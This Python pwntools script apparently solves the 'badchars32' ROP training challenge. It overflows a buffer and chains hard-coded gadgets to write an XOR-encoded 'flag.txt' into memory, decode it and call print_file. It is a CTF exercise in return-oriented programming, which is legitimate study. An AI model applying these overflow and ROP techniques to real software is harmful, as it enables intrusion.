from pwn import *
elf = context.binary = ELF("./badchars32")
io = process("./badchars32")

data_addr = 0x0804a018

gadget_write1 = 0x080485b9          # pop esi; pop edi; pop ebp; ret
gadget_write2 = 0x0804854f          # mov dword [edi], esi
gadget_xor1 = 0x080485bb            # pop ebp ; ret
gadget_xor2 = 0x0804839d            # pop ebx ; ret
gadget_xor3 = 0x08048547            # xor byte ptr [ebp], bl ; ret

badchars = ['x','g','a','.']
def write_in_data(data,key: int = 0x2):
    p = b""
    # Write "flag.txt"
    for i in range(0,len(data),4):
        chunk = data[i:i+4].ljust(4,b"\x00")
        p += p32(gadget_write1)
        p += p32(int.from_bytes(chunk,'little'))  #esi
        p += p32(data_addr + i)                   #edi
        p += p32(0)                               #ebp
        p += p32(gadget_write2)
    # Xor
    for i in range(0,len(data)):
        p += p32(gadget_xor1)             
        p += p32(data_addr + i)                     #ebp
        p += p32(gadget_xor2)             
        p += p32(key)                               #ebx
        p += p32(gadget_xor3)
    return p

def xor_bytes(data: bytes, key: int = 0x2) -> bytes:
    return bytes([b ^ key for b in data])


rop = ROP("./badchars")
payload = b"A" * 44
payload += write_in_data(xor_bytes(b"flag.txt"))  # write "flag.txt" en .data
payload += p32(elf.plt['print_file'])  # print_file("flag.txt")
payload += p32(0)                      # ebp
payload += p32(data_addr)              # "flag.txt"

io.recv()
io.sendline(payload)
io.interactive()


